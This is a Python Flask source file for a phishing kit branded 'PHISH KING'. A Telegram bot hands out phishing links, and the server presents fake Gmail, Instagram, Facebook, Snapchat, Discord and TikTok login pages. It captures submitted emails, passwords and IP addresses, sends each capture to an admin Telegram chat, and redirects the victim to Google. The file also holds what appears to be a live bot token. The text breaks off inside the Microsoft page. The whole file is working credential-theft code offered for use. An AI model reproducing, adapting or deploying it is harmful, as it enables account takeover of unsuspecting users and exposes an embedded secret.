from flask import Flask, request
import os
import requests
import threading
import time
import json
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
PHISHING_DATA = []
STATS = {'total_visits': 0, 'total_captures': 0, 'services': {}}
running = True
last_update_id = 0

def send_msg(chat_id, text, reply_markup=None):
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        data['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=10)
    except:
        pass

def answer_callback(query_id):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={'callback_query_id': query_id}, timeout=5)
    except:
        pass

def update_stats(service):
    global STATS
    STATS['total_visits'] += 1
    if service not in STATS['services']:
        STATS['services'][service] = {'visits': 0, 'captures': 0}
    STATS['services'][service]['visits'] += 1

def bot_loop():
    global last_update_id
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
                              params={'offset': last_update_id + 1, 'timeout': 30}).json()
            if resp['ok']:
                for update in resp['result']:
                    last_update_id = update['update_id']
                    
                    if 'message' in update:
                        msg = update['message']
                        cid = msg['chat']['id']
                        txt = msg.get('text', '').lower()
                        uid = str(msg['from']['id'])
                        
                        if '/start' in txt:
                            markup = {"inline_keyboard": [
                                [{"text": "📧 GMAIL", "callback_data": f"gmail_{uid}"}],
                                [{"text": "📸 INSTAGRAM", "callback_data": f"insta_{uid}"}],
                                [{"text": "📘 FACEBOOK", "callback_data": f"fb_{uid}"}],
                                [{"text": "👻 SNAPCHAT", "callback_data": f"snap_{uid}"}],
                                [{"text": "💬 DISCORD", "callback_data": f"discord_{uid}"}],
                                [{"text": "🎵 TIKTOK", "callback_data": f"tiktok_{uid}"}],
                                [{"text": "🔐 MICROSOFT", "callback_data": f"ms_{uid}"}]
                            ]}
                            send_msg(cid, f"🎉 <b>👑 PHISH KING 👑</b>\n\n🔥 Premium Services Ready!\n📱 Perfect Mobile UI", markup)
                        
                        if txt == '/data' and str(cid) == ADMIN_CHAT_ID:
                            if PHISHING_DATA:
                                recent = PHISHING_DATA[-15:]
                                data_text = "<b>📋 LAST 15 HITS:</b>\n\n"
                                for i, hit in enumerate(recent, 1):
                                    data_text += f"{i}. <code>{hit}</code>\n"
                                send_msg(cid, data_text)
                            else:
                                send_msg(cid, "📭 No captures yet!")
                        
                        if txt == '/stats' and str(cid) == ADMIN_CHAT_ID:
                            stats_text = f"""
🎯 <b>📊 PHISH KING STATS</b> 🎯

📈 <b>TOTAL VISITS:</b> {STATS['total_visits']}
🎣 <b>TOTAL CAPTURES:</b> {STATS['total_captures']}
💰 <b>SUCCESS RATE:</b> {STATS['total_captures']/max(STATS['total_visits'],1)*100:.1f}%

🔥 <b>TOP SERVICES:</b>
"""
                            sorted_services = sorted(STATS['services'].items(), key=lambda x: x[1]['captures'], reverse=True)
                            for i, (service, data) in enumerate(sorted_services[:5], 1):
                                rate = data['captures']/max(data['visits'],1)*100
                                stats_text += f"{i}. <b>{service.upper()}</b>: {data['captures']} hits ({rate:.0f}%)\n"
                            
                            stats_text += f"\n⏰ <b>Last Update:</b> {datetime.now().strftime('%H:%M:%S')}"
                            send_msg(cid, stats_text)
                    
                    if 'callback_query' in update:
                        query = update['callback_query']
                        query_id = query['id']
                        cid = query['from']['id']
                        data = query['data']
                        
                        answer_callback(query_id)
                        service, uid = data.split('_', 1)
                        url = f"https://myphish.onrender.com/phish/{service}/{uid}"
                        send_msg(cid, f"✅ <b>{service.upper()} PHISH LIVE!</b>\n\n🔗 <code>{url}</code>\n\n📱 Perfect Clone Page!")
        except:
            pass
        time.sleep(1)

@app.route('/')
def home():
    return f"""
<h1>🎣 PHISH KING DASHBOARD</h1>
<p>📊 Visits: {STATS['total_visits']} | Captures: {STATS['total_captures']}</p>
"""

@app.route('/phish/<service>/<int:user_id>', methods=['GET', 'POST'])
def phish(service, user_id):
    if request.method == 'GET':
        update_stats(service)
        return get_phish_page(service)
    else:
        # CAPTURE CREDENTIALS
        email = request.form.get('email', request.form.get('username', ''))
        password = request.form.get('password', '')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        hit = f"[{timestamp}] {service.upper()} | UID:{user_id} | IP:{ip} | {email}:{password}"
        PHISHING_DATA.append(hit)
        STATS['total_captures'] += 1
        if service in STATS['services']:
            STATS['services'][service]['captures'] += 1
        
        # INSTANT ADMIN NOTIFY
        send_msg(ADMIN_CHAT_ID, f"🎣 <b>NEW HIT!</b>\n\n<code>{hit}</code>")
        
        return '<script>window.location="https://www.google.com";</script>'

def get_phish_page(service):
    pages = {
        'gmail': '''
<!DOCTYPE html>
<html><head>
<title>Sign in - Google Accounts</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',sans-serif;background:#f1f3f4;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
.login-container{{background:#fff;max-width:396px;width:100%;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.15);overflow:hidden}}
.header{{background:#fff;padding:24px 24px 0}}
.logo{{height:24px;background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgxIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMTgxIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xNzguMjM5IDE5Ljk1OFYxNS43ODlIMTU1LjY5OFYxOS45NThIMTU5LjkwNlY0MC4yOTZIMTUzLjg1OFgyLjY2NlY0NC4yMTZIMTUzLjg1OFY0Ny4zOTZIMTU5LjkwNlY0NC4yMTZIMTc4LjIzOVY0MC4yOTZIMTc0LjAyOXYtMjAuMzM4SDE3OC4yMzlaTTE0NS4wMTUgMTQuNDg5SDExMi40NzJWMTEuMzcySDk2LjExMjZWMjAuNTQ4SDExMi40NzJWMjMuNzE4SDkyLjA5NTZWNDcuMzk2SDk2LjExMjZaTTc4LjY5MDcgMjAuNTQ4SDY0LjE1MDdWMjMuNzE4SDgwLjUxMDdWMjYuOTg4SDY0LjE1MDdWMjkuMTU4SDgwLjUxMDdWMzIuMzI4SDY0LjE1MDdWMzQuNDk4SDgwLjUxMDdWMzcuNjY4SDY0LjE1MDdWNDcuMzk2SDY4LjE2NzZWNDMuMjI4SDc4LjY5MDdWMjAuNTQ4Wk0xMzYuNzM2IDE2LjE2MkMxMzYuNzM2IDE0LjcyIDEzNS40MzEgMTMuNDEzIDEzMy45OTcgMTMuNDEzQzEzMi41NjMgMTMuNDEzIDEzMS4yNTYgMTQuNzIgMTMxLjI1NiAxNi4xNjJDMTMxLjI1NiAxNy41OTggMTMyLjU2MyAxOS4xMDUgMTMzLjk5NyAxOS4xMDVDMTM1LjQzMSAxOS4xMDUgMTM2LjczNiAxNy41OTggMTM2LjczNiAxNi4xNjJaIiBmaWxsPSIjNDI4NUY0Ii8+PC9zdmc+") no-repeat center/contain;margin-bottom:16px}}
.content{{padding:0 24px 24px}}
.title{{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}}
.subtitle{{color:#5f6368;font-size:16px;margin-bottom:32px}}
.form-group{{margin-bottom:24px}}
.input{{width:100%;padding:13px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;line-height:1.5;background:#fff;font-family:'Roboto',sans-serif}}
.input:focus{{outline:none;border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}}
.btn{{width:100%;height:40px;background:#1a73e8;border:none;border-radius:4px;color:#fff;font-family:'Roboto',sans-serif;font-size:14px;font-weight:500;cursor:pointer}}
.btn:hover{{background:#1557b0}}
</style></head><body>
<div class="login-container">
<div class="header"><div class="logo"></div></div>
<div class="content">
<div class="title">Sign in</div>
<div class="subtitle">Use your Google Account</div>
<form method="POST">
<div class="form-group">
<input class="input" name="email" type="email" placeholder="Email or phone" required autocomplete="username">
</div>
<div class="form-group">
<input class="input" name="password" type="password" placeholder="Password" required autocomplete="current-password">
</div>
<button class="btn" type="submit">Next</button>
</form>
</div></div></body></html>''',
        
        'insta': '''
<!DOCTYPE html>
<html><head><title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.main-container{max-width:350px;width:100%;background:#fff;border:1px solid #dbdbdb;border-radius:1px}
.logo-container{height:63px;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);display:flex;align-items:center;justify-content:center;margin-bottom:34px}
.logo{height:51px;background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA2IiBoZWlnaHQ9IjEwNiIgZmlsbD0iI2ZmZiIgdmlld0JveD0iMCAwIDEwNiAxMDYiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTEwNS4yIDUzLjVDMTA1LjIgNDcuNCAxMDQuNyA0MS4zIDEwMy4yIDM1LjdDOTkuNCAyNS40IDkwLjkgMTYuMiA4MC4xIDkuNUM3MC4xIDMuMiA1OS4zIDAgNDguNSAwQzM3LjcgMCAyNy4xIDMuMiAxNy4xIDkuNUM2LjMgMTYuMiAwLjEgMjUuNCA0LjEgMzUuN0M4LjcgNDEuMyAxMC4yIDQ3LjQgMTAuMiA1My41VjUzLjVDMTAuMiA1OS42IDEwLjcgNjUuNyA0LjEgNzEuNUMwLjEgODEuOCA4LjkgOTAuOSA2LjMgOTguNUMxNi4zIDEwNC44IDI3LjEgMTA2IDM3LjkgMTA2QzQ4LjcgMTA2IDU5LjUgMTA0LjggNjkuNCA5OC41Qzc5LjIgOTAuOSA4Ny45IDgxLjggOTEuNSA3MS41QzkzIDE2NS43IDkyLjUgNTkuNiA5Mi41IDUzLjVWMzUuN0M5Mi41IDI5LjYgOTMuMCAyMy41IDkxLjUgMTcuNUM4Ny45IDYuOCA3OS4yIDAuMSA2OS40IDEuNUM1OS41IDMuMiA0OC43IDYuOCA0Mi41IDE3LjNDMzYuMyAyNy44IDMzLjcgMzkuNSAzMy43IDUzLjVWMzMuNUMzMy43IDI3LjQgMzYuMyAyMy43IDQyLjUgMTcuM0M0OC43IDYuOCA1OS41IDMuMiA2OS40IDEuNUM3OS4yIDAuMSA4Ny45IDYuOCA5MS41IDE3LjNDOTMuMCAyMy41IDkyLjUgMjk2IDkyLjUgMzUuN1Y1My41WiIgLz48L3N2Zz4=") center/contain no-repeat}
.form-container{padding:10px 40px}
.input-group{margin-bottom:6px}
.input-group input{width:100%;border:1px solid #efefef;border-radius:3px;background:#fafafa;padding:9px 0 7px 8px;font-size:14px;color:#262626;outline:none}
.input-group input::placeholder{color:#8e8e8e}
.login-btn{width:100%;background:#0095f6;border:none;border-radius:4px;color:#fff;font-weight:600;padding:7px;font-size:14px;cursor:pointer;margin:8px 40px 20px}</style></head>
<body>
<div class="main-container">
<div class="logo-container"><div class="logo"></div></div>
<div class="form-container">
<form method="POST">
<div class="input-group">
<input name="username" type="text" placeholder="Phone number, username, or email" required>
</div>
<div class="input-group">
<input name="password" type="password" placeholder="Password" required>
</div>
<button class="login-btn" type="submit">Log in</button>
</form>
</div></div></body></html>''',
        
        'fb': '''
<!DOCTYPE html>
<html><head><title>Facebook - log in or sign up</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.container{max-width:400px;width:100%;background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden}
.header{background:#1877f2;color:#fff;padding:20px;text-align:center}
.logo{height:40px;background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjU2IiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMjU2IDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyNTYiIGhlaWdodD0iNjAiIGZpbGw9IiMxODc3RjIiLz48cGF0aCBkPSJNMTk3LjA3MiAxMi4yNTZIMTU2LjUwNFYxOS44OUgxOTcuMDcyVjEyLjI1NlpNMTk3LjA3MiAyMi4zMTZIMTU2LjUwNFYyOS45NDhIMTc5LjIzMlY0Ny40MTZIMTU2LjUwNFY1NC41NjhIMTc5LjIzMlY0Ny40MTZIMTY1LjI1NlY0Ny40MTZIMTY1LjI1NlYyMi4zMTZaIiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg==") center/contain no-repeat;margin-bottom:10px}
.title{font-size:24px;font-weight:700;margin-bottom:5px}
.subtitle{font-size:16px;opacity:.8}
.form{padding:20px}
.input-group{margin-bottom:15px}
.input{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:16px;background:#fff}
.input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
.btn:hover{background:#166fe5}
.links{text-align:center;margin-top:20px;font-size:14px}
.links a{color:#1877f2;text-decoration:none;margin:0 5px}</style></head>
<body>
<div class="container">
<div class="header">
<div class="logo"></div>
<div class="title">Connect with friends and the world around you on Facebook.</div>
</div>
<div class="form">
<form method="POST">
<div class="input-group">
<input class="input" name="email" type="email" placeholder="Email or phone number" required>
</div>
<div class="input-group">
<input class="input" name="password" type="password" placeholder="Password" required>
</div>
<button class="btn" type="submit">Log In</button>
</form>
<div class="links">
<a href="#">Forgot Password?</a>
</div>
</div>
</div></body></html>''',
        
        'snap': '''
<!DOCTYPE html>
<html><head><title>Snapchat</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#ff0050,#ffcc00,#00d4ff);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{max-width:350px;width:100%;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,.3)}
.header{background:#ff0050;color:#fff;padding:30px 20px;text-align:center}
.logo{height:60px;background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI4IiBoZWlnaHQ9IjEyOCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iNjQiIGN5PSI2NCIgcj0iNjQiIGZpbGw9IiNGRjAwNTAiLz48cGF0aCBkPSJNODAgODhjMCAxMC4yLTguMiAxOC4yLTE4LjIgMTguMnMtMTguMi04LTE4LjItMThjMC0xMC4yIDgtMTguMiAxOC4yLTE4LjJzMTguMiA4IDE4LjIgMTh6IiBmaWxsPSJ3aGl0ZSIvPjxwYXRoIGQ9Ik00OCAxMDBjMCAxMC4yIDggMTguMiAxOC4yIDE4LjJzMTguMi04IDE4LjItMThjMC0xMC4yLTgtMTguMi0xOC4yLTE4LjJTMCA4OS44IDE4LjIgODkuOHoiIGZpbGw9IiNGRjAwNTAiLz48L3N2Zz4=") center/contain no-repeat;margin-bottom:10px}
.title{font-size:24px;font-weight:700;margin-bottom:5px}
.form{padding:20px}
.input-group{margin-bottom:15px}
.input{width:100%;padding:15px;border:none;border-radius:25px;font-size:16px;background:rgba(255,255,255,.9);box-shadow:0 4px 15px rgba(0,0,0,.1)}
.btn{width:100%;padding:15px;background:#ff0050;color:#fff;border:none;border-radius:25px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}</style></head>
<body>
<div class="container">
<div class="header">
<div class="logo"></div>
<div class="title">Log in to Snapchat</div>
</div>
<div class="form">
<form method="POST">
<div class="input-group">
<input class="input" name="email" type="email" placeholder="Email" required>
</div>
<div class="input-group">
<input class="input" name="password" type="password" placeholder="Password" required>
</div>
<button class="btn" type="submit">Log In</button>
</form>
</div></div></body></html>''',
        
        'discord': '''
<!DOCTYPE html>
<html><head><title>Discord</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#36393f;font-family:"Whitney","Helvetica Neue",Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;color:#fff}
.container{max-width:400px;width:100%;background:rgba(0,0,0,.8);border-radius:8px;padding:40px}
.logo{height:50px;background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMjgwIDgwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyODAiIGhlaWdodD0iODAiIGZpbGw9IiM1NUJDRUYiLz48L3N2Zz4=") center/contain no-repeat;margin-bottom:20px}
.title{font-size:28px;font-weight:700;margin-bottom:10px;text-align:center}
.subtitle{font-size:16px;margin-bottom:30px;text-align:center;opacity:.8}
.form{}
.input-group{margin-bottom:20px}
.input{width:100%;padding:15px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:4px;color:#fff;font-size:16px}
.input::placeholder{color:rgba(255,255,255,.5)}
.btn{width:100%;padding:15px;background:#5865f2;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
.btn:hover{background:#4752c4}</style></head>
<body>
<div class="container">
<div class="logo"></div>
<div class="title">LOGIN</div>
<div class="subtitle">Login to continue</div>
<form method="POST">
<div class="input-group">
<input class="input" name="email" type="email" placeholder="Email" required>
</div>
<div class="input-group">
<input class="input" name="password" type="password" placeholder="Password" required>
</div>
<button class="btn" type="submit">Continue</button>
</form>
</div></body></html>''',
        
        'tiktok': '''
<!DOCTYPE html>
<html><head><title>TikTok</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#fe2c55,#ff725c,#ffaa5c);font-family:-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#fff}
.container{max-width:350px;width:100%;background:rgba(255,255,255,.1);backdrop-filter:blur(10px);border-radius:20px;border:1px solid rgba(255,255,255,.2);padding:40px;box-shadow:0 20px 40px rgba(0,0,0,.3)}
.logo{height:50px;background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iNTAiIGN5PSI1MCIgcj0iNTAiIGZpbGw9IiNGRjAwRkYiLz48L3N2Zz4=") center/contain no-repeat;margin-bottom:20px}
.title{font-size:24px;font-weight:700;margin-bottom:10px;text-align:center}
.form{}
.input-group{margin-bottom:20px}
.input{width:100%;padding:15px;border:none;border-radius:25px;background:rgba(255,255,255,.2);color:#fff;font-size:16px;text-align:center}
.input::placeholder{color:rgba(255,255,255,.7)}
.btn{width:100%;padding:15px;background:#000;color:#fff;border:none;border-radius:25px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}</style></head>
<body>
<div class="container">
<div class="logo"></div>
<div class="title">Log in</div>
<form method="POST">
<div class="input-group">
<input class="input" name="email" type="email" placeholder="Email or Username" required>
</div>
<div class="input-group">
<input class="input" name="password" type="password" placeholder="Password" required>
</div>
<button class="btn" type="submit">Log in</button>
</form>
</div></body></html>''',
        
        'ms': '''
<!DOCTYPE html>
<html><head><ti
